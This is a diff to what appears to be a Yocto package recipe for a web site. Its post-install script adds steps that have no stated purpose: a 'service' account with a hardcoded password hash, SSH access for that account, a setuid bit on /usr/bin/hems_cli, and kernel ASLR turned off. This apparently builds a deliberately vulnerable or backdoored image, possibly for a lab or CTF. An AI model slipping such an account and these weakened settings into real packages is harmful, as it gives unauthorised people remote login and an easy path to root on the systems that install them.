@@ -30,15 +30,32 @@ do_install () {
 pkg_postinst_${PN} () {
     sed -i "s/apache2\/default-site\/htdocs/apache2\/htdocs/" /etc/apache2/httpd.conf
     /etc/init.d/apache2 reload
+    
+    useradd -p "\$6\$HUpwgjNWFh9bIDK\$DYpDI7MWK9Rf2fWKzMQzYieqGJWrTDWnOLr.zRpOkhwbpxycIRjy/G5NNnwhZOjxZsw7Wd2KYOj7.hdDKpqPG0" service
+    sed -i "s/AllowUsers root/AllowUsers root service/" /etc/ssh/sshd_config
+    /etc/init.d/sshd restart
+    
+    chmod u+s /usr/bin/hems_cli
+    
+    echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf
+    sysctl -p /etc/sysctl.conf
 }
 
 pkg_postrm_${PN} () {
     sed -i "s/apache2\/htdocs/apache2\/default-site\/htdocs/" /etc/apache2/httpd.conf
     /etc/init.d/apache2 reload
+    
+    userdel -r service
+    sed -i "s/AllowUsers root service/AllowUsers root/" /etc/ssh/sshd_config
+    /etc/init.d/sshd restart
+
+    sed -i "s/kernel.randomize_va_space = 0//" /etc/sysctl.conf
+    sysctl -p /etc/sysctl.conf
 }
 
 RDEPENDS_${PN} = " \
     apache2 \
+    hefty-howard-cli \
     php-fpm \
     php-fpm-apache2 \
     "
